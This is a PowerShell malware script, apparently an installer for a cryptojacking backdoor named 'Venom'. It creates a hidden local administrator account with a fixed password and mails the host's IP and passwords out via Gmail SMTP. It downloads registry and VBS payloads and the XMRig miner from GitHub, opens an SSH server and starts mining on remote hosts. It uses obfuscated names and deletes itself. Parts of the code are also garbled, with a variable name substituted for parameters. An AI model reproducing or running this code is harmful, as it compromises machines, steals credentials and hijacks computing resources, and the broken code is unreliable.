function tGBTxmsZSDrH {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = ".Venom"
    $Password = ConvertTo-SecureString ".V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $Password -FullName ".Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}

$VwSntuJIlMmo = tGBTxmsZSDrH
$CnoDdShspyQB = "$env:temp/$VwSntuJIlMmo"
$rhZepgLQaCHN = Get-Location

$YWNqxtueVmln = Get-Content PkUbTvqXFIdB.txt
$bEISMDZaYLdl = Get-Content NzKnmxLrbsBw.txt

$InterfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).InterfaceAlias

$IP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $InterfaceAlias).IPAddress >> ip.txt

$CnoDdShspyQB = "$env:temp/$VwSntuJIlMmo"
$KekiPVsfUNLB = "$env:UserName.rat"

Set-Content -CnoDdShspyQB $KekiPVsfUNLB -Value ""

Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $IP
Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $Password
Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $CnoDdShspyQB

$Password = ConvertTo-SecureString $bEISMDZaYLdl -AsPlainText -Force
$plainPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password))
Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $plainPassword

Add-Content -CnoDdShspyQB $KekiPVsfUNLB -Value $CnoDdShspyQB

Send-MailMessage `
    -From $YWNqxtueVmln `
    -To $YWNqxtueVmln `
    -Subject "IP Address Notification from $env:UserName" `
    -Attachment $KekiPVsfUNLB `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $YWNqxtueVmln, (ConvertTo-SecureString -String $plainPassword -AsPlainText -Force))

copy $rhZepgLQaCHN\ip.txt $CnoDdShspyQB

Remove-Item $KekiPVsfUNLB
Remove-Item ip.txt

mkdir $CnoDdShspyQB
cd $CnoDdShspyQB

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "QyjAaZDBbNPk.reg"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs -OutFile "FoRAUwtxKkSB.vbs"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"

Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs -OutFile "ZDaFvwjOosKx.vbs"

#Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/Ips.txt -OutFile "Ips.txt"


Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

./QyjAaZDBbNPk.reg; ./FoRAUwtxKkSB.vbs

mv $CnoDdShspyQB\ZDaFvwjOosKx.vbs $rhZepgLQaCHN

Start-Sleep -Seconds 30

New-Item -Name "$VwSntuJIlMmo" -CnoDdShspyQB "$CnoDdShspyQB" -ItemType Directory
cd $VwSntuJIlMmo

$DCtviRxcUnEV = $PVwSntuJIlMmo

Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"

Expand-Archive -CnoDdShspyQB "$DCtviRxcUnEV\xmrig-6.22.2-msvc-win64.zip" -DestinationCnoDdShspyQB "$DCtviRxcUnEV"

Get-ChildItem -CnoDdShspyQB $DCtviRxcUnEV

$newConfigCnoDdShspyQB = "$CnoDdShspyQB\config.json"
$targetConfigCnoDdShspyQB = "$DCtviRxcUnEV\xmrig-6.22.2\config.json"

if (Test-CnoDdShspyQB -CnoDdShspyQB $newConfigCnoDdShspyQB) {
    Copy-Item -CnoDdShspyQB $newConfigCnoDdShspyQB -Destination $targetConfigCnoDdShspyQB -Force
    Write-Output "Config.json file has been replaced successfully."
} else {
    Write-Output "New config.json file not found at the specified CnoDdShspyQB."
}

# Define the CnoDdShspyQB to the text file with IP addresses
$ipFile = "$CnoDdShspyQB\ip.txt"

# Define the CnoDdShspyQB to XMRig executable
$xmrCnoDdShspyQB = "$DCtviRxcUnEV\xmrig.exe"

# Define the configuration file CnoDdShspyQB
$configCnoDdShspyQB = "$DCtviRxcUnEV\config.json"

# Send the YWNqxtueVmln with Rig Status
Send-MailMessage `
    -From $YWNqxtueVmln `
    -To $YWNqxtueVmln `
    -Subject "XMRig Execution Status from $env:UserName" `
    -Body "Xmrig Process Starting..." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $YWNqxtueVmln, (ConvertTo-SecureString -String $bEISMDZaYLdl -AsPlainText -Force))

# Read the IP addresses from the text file

$ips = Get-Content -CnoDdShspyQB $ipFile

for ($ip in $ips) {
    try {
        Write-Output "Processing IP: $ip"
        
        # Command to start XMRig with the configuration file
        $command = "$xmrCnoDdShspyQB -c $configCnoDdShspyQB"

        # Execute the command on the remote computer with elevated privileges
        Invoke-Command -ComputerName $ip -ScriptBlock {
            param($command)
            Start-Process -FileCnoDdShspyQB "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -Verb RunAs
        } -ArgumentList $command

        Write-Output "XMRig started on IP: $ip"
        Send-MailMessage `
            -From $YWNqxtueVmln `
            -To $YWNqxtueVmln `
            -Subject "XMRig Execution Success" `
            -Body "XMRig has successfully started on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $YWNqxtueVmln, (ConvertTo-SecureString -String $bEISMDZaYLdl -AsPlainText -Force))
    } catch {
        Write-Output "Error processing IP: $ip"
        Send-MailMessage `
            -From $YWNqxtueVmln `
            -To $YWNqxtueVmln `
            -Subject "XMRig Execution Failure" `
            -Body "Failed to start XMRig on IP: $ip" `
            -SmtpServer "smtp.gmail.com" `
            -Port 587 `
            -UseSsl `
            -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $YWNqxtueVmln, (ConvertTo-SecureString -String $bEISMDZaYLdl -AsPlainText -Force))
    }
}

Write-Output "Script execution completed"
Send-MailMessage `
    -From $YWNqxtueVmln `
    -To $YWNqxtueVmln `
    -Subject "Script Execution Completed" `
    -Body "The script has finished executing. Please check the status of each IP address." `
    -SmtpServer "smtp.gmail.com" `
    -Port 587 `
    -UseSsl `
    -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $YWNqxtueVmln, (ConvertTo-SecureString -String $bEISMDZaYLdl -AsPlainText -Force))



# hide venom user
# Navigate to the C:\Users directory
Set-Location -CnoDdShspyQB 'C:\Users'

# Check if .Venom directory exists
if (Test-CnoDdShspyQB -CnoDdShspyQB '.Venom' -CnoDdShspyQBType Container) {
    # Set hidden, system, and read-only attributes to .Venom
    attrib +h +s +r .Venom
    Write-Output ".Venom directory attributes set to hidden, system, and read-only"
} else {
    Write-Output ".Venom directory does not exist"
    exit 1
}

# start rig
#powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
cd $CnoDdShspyQB

Remove-Item config.json
Remove-Item QyjAaZDBbNPk.reg 
Remove-Item FoRAUwtxKkSB.vbs

cd $rhZepgLQaCHN

Start-Process "cscript.exe" "ZDaFvwjOosKx.vbs"

Start-Sleep -Seconds 200

del installer.ps1

